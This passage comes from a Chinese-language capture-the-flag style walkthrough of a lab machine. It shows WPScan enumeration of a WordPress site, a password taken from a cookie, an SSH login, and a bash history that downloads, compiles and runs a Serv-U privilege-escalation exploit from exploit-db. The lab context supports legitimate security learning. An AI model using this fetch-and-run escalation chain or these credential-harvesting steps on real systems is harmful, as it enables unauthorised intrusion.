+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] Upload directory has listing enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] The external WP-Cron seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-cron.php
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confidence: 60%
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Atom Generator (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, &lt;generator uri=&#34;https://wordpress.org/&#34; version=&#34;5.3.6&#34;&gt;WordPress&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confirmed By: Style Etag (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: &#39;</span>5.3.6<span style="color:#ff5c57">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> The main theme could not be detected.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Vulnerable Plugins <span style="color:#ff6ac1">(</span>via Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:00:28 &lt;<span style="color:#ff6ac1">=======================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">7343</span> / 7343<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:28
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> No plugins Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Vulnerable Themes <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:00:00 &lt;<span style="color:#ff6ac1">=========================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">652</span> / 652<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> No themes Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Timthumbs <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:00:02 &lt;<span style="color:#ff6ac1">=======================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">2568</span> / 2568<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:02
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> No Timthumbs Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Config Backups <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Checking Config Backups - Time: 00:00:00 &lt;<span style="color:#ff6ac1">==========================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">137</span> / 137<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> No Config Backups Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating DB Exports <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Checking DB Exports - Time: 00:00:00 &lt;<span style="color:#ff6ac1">================================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">75</span> / 75<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> No DB Exports Found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Medias <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">(</span>Permalink setting must be <span style="color:#ff5c57">set</span> to <span style="color:#5af78e">&#34;Plain&#34;</span> <span style="color:#ff6ac1">for</span> those to be detected<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Brute Forcing Attachment IDs - Time: 00:00:04 &lt;<span style="color:#ff6ac1">=====================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">100</span> / 100<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:04
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> Medias<span style="color:#ff6ac1">(</span>s<span style="color:#ff6ac1">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">38</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">39</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">42</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">44</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">48</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">49</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">51</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">75</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">74</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">77</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">96</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">99</span>
+</span></span><span style="display:flex;"><span> | Found By: Attachment Brute Forcing <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Enumerating Users <span style="color:#ff6ac1">(</span>via Passive and Aggressive Methods<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> Brute Forcing Author IDs - Time: 00:00:00 &lt;<span style="color:#ff6ac1">===========================================</span>&gt; <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">10</span> / 10<span style="color:#ff6ac1">)</span> 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> User<span style="color:#ff6ac1">(</span>s<span style="color:#ff6ac1">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> valak
+</span></span><span style="display:flex;"><span> | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Login Error Messages <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> krampus
+</span></span><span style="display:flex;"><span> | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Login Error Messages <span style="color:#ff6ac1">(</span>Aggressive Detection<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> You can get a free API token with <span style="color:#ff9f43">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Finished: Mon Jan <span style="color:#ff9f43">19</span> 00:51:58 <span style="color:#ff9f43">2026</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Requests Done: <span style="color:#ff9f43">10929</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Cached Requests: <span style="color:#ff9f43">11</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Data Sent: 3.643 MB
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Data Received: 1.627 MB
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Memory used: 206.777 MB
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Elapsed time: 00:01:01</span></span></code></pre></div><ul>
+<li><code>-e</code>是<code>--enumerate</code>的缩写，告诉WPScan区枚举慕白哦网站的特定信息；<code>--ignore-main-redirect</code>强制WPScan忽略服务器发出的重定向请求；<code>--plugins-detection aggressive</code>深度探测，默认探测只看页面源代码，积极模式会主动请求插件路径；<code>--force</code>强制执行，WPScan忽略一些非致命的警告</li>
+<li><code>wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force</code>，其中<code>--plugins-detection aggressive</code>针对插件，而没有用<code>--users-detection aggressive</code>针对用户账号，可以同时用<code>--users-detection aggressive --plugins-detection aggressive</code>实现激进枚举用户+激进枚举插件，但会增加耗时。</li>
+<li>得到合法的后台用户名<code>valak</code>和<code>krampus</code>，只要匹配密码就可登录。</li>
+</ul>
+<p>接着检查/wp-content/uploads/有无相关文件http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
+结果发现一个<code>Talk To VALAK/</code>文件夹，F12进入网络模式，输入任意一个数字，返回的状态200，方法post，文件index.php，其返回的cookie中含有密码</p>
+<pre tabindex="0"><code>M4k3Ad3a1</code></pre><p>尝试登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh krampus@192.168.242.230
+</span></span><span style="display:flex;"><span>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span style="display:flex;"><span>** This session may be vulnerable to <span style="color:#5af78e">&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span style="display:flex;"><span>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span style="display:flex;"><span>krampus@192.168.242.230<span style="color:#ff5c57">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#ff6ac1">(</span>GNU/Linux 5.3.0-53-generic x86_64<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Canonical Livepatch is available <span style="color:#ff6ac1">for</span> installation.
+</span></span><span style="display:flex;"><span>   - Reduce system reboots and improve kernel security. Activate at:
+</span></span><span style="display:flex;"><span>     https://ubuntu.com/livepatch
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">294</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">178</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Your Hardware Enablement Stack <span style="color:#ff6ac1">(</span>HWE<span style="color:#ff6ac1">)</span> is supported <span style="color:#ff6ac1">until</span> April 2023.
+</span></span><span style="display:flex;"><span>Last login: Wed Jun <span style="color:#ff9f43">11</span> 17:35:43 <span style="color:#ff9f43">2025</span> from 192.168.188.6
+</span></span><span style="display:flex;"><span>krampus@beelzebub:~$</span></span></code></pre></div><p>成功登录</p>
+<h2 id="提权">提权<a class="anchor" href="#%e6%8f%90%e6%9d%83">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>krampus@beelzebub:~$ cat .Serv-U-Tray.conf
+</span></span><span style="display:flex;"><span>Theme Number0krampus@beelzebub:~$ -U Tray<span style="color:#5af78e">\T</span>hemes
+</span></span><span style="display:flex;"><span>krampus@beelzebub:~$ cat .bash_history
+</span></span><span style="display:flex;"><span>mysql -u root -p
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>lks
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>nano /etc/host
+</span></span><span style="display:flex;"><span>nano /etc/hosts <span style="color:#78787e"># 系统本地的 DNS 映射表，可以绕过公共DNS解析、测试本地站点、屏蔽恶意网站</span>
+</span></span><span style="display:flex;"><span>su root <span style="color:#78787e"># 切换到root超级用户身份</span>
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">exit</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ff9f43">0750</span> html/
+</span></span><span style="display:flex;"><span>ifconfig
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> /var/lib/mysql/
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> wordpress/
+</span></span><span style="display:flex;"><span>sudo su
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> Desktop/
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cat user.txt 
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>sudo -1
+</span></span><span style="display:flex;"><span>sudo -i
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>sudo -i
+</span></span><span style="display:flex;"><span>find / -prem -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -prem -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>cat /etc/issue
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> ../
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> ../../../../
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>find / -prem -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> /usr/local/Serv-U/
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span>
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ps -aux
+</span></span><span style="display:flex;"><span>ps -a
+</span></span><span style="display:flex;"><span>ps -a -U root
+</span></span><span style="display:flex;"><span>ps -a -U root | grep <span style="color:#5af78e">&#39;Serv&#39;</span>
+</span></span><span style="display:flex;"><span>ps -U root -au
+</span></span><span style="display:flex;"><span>ps -U root -au | sort -u
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> /tmp/
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>find / -prem -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#ff6ac1">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>wget https://www.exploit-db.com/download/47009
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>mv <span style="color:#ff9f43">47009</span> ./exploit.c <span style="color:#78787e"># mv可以移动或重命名，./表示当前目录，exploit.c是新的文件名，即将47009重命名为当前目录下的exploit.c</span>
+</span></span><span style="display:flex;"><span>gcc exploit.c -o exploit
+</span></span><span style="display:flex;"><span>./exploit 
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> ../../../../../../../
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> <span style="color:#ff5c57">cd</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span>
+</span></span><span style="display:flex;"><span>grep -r <span style="color:#5af78e">&#39;beelzebub&#39;</span>
+</span></span><span style="display:flex;"><span>grep -r <span style="color:#5af78e">&#39;love&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> .local/share
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> Trash/
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cat info
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> info
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> ../
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> ../
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>rm -rf Trash/
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">history</span> -R
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">history</span> -r
+</span></span><span style="display:flex;"><span>mysql -u root -p
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>lks
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>nano /etc/host
+</span></span><span style="display:flex;"><span>nano /etc/hosts
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">exit</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">history</span>
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span>
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ip link
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">history</span>
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> /tmp/
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">exit</span>
+</span></span><span style="display:flex;"><span>clear
+</span></span><span style="display:flex;"><span>cat /etc/systemd/system/LingJingCmd.service
+</span></span><span style="display:flex;"><span>vi /etc/network/interfaces
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>ip addr
+</span></span><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>quit
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">help</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">exit</span>
+</span></span><span style="display:flex;"><span>exit</span></span></code></pre></div><ul>
+<li>第一个命令查看<code>.Serv-U-Tray.conf</code>的隐藏配置文件内容，Serv-U是一款非常著名的FTP服务器软件</li>
+<li><code>-U Tray\Themes </code>不是一个有效的命令，由于上一个<code>cat</code>命令输出的内容没有换行，导致命令提示符紧跟在内容后面，</li>
+<li>第二个命令查看当前用户<code>krampus</code>的命令历史记录，得知目标运行servU，且在历史记录中找到了漏洞利用代码的位置</li>
+</ul>
+<pre tabindex="0"><code>wget https://www.exploit-db.com/download/47009</code></pre><ul>
+<li>将文件下载到kali linux的<code>/home/kali</code>（或者用波浪号<code>~</code>表示），再将文件名字修改为<code>47009.c</code></li>
+<li>由于kali linux的ip为<code>192.168.203.129</code>，而靶机ip为lingjing实验室环境分配的<code>192.168.242.230</code>，两者网段不匹配，因此可以采用绕过回传限制的方法，<strong>Base64编码</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ base64 47009.c -w <span style="color:#ff9f43">0</span>
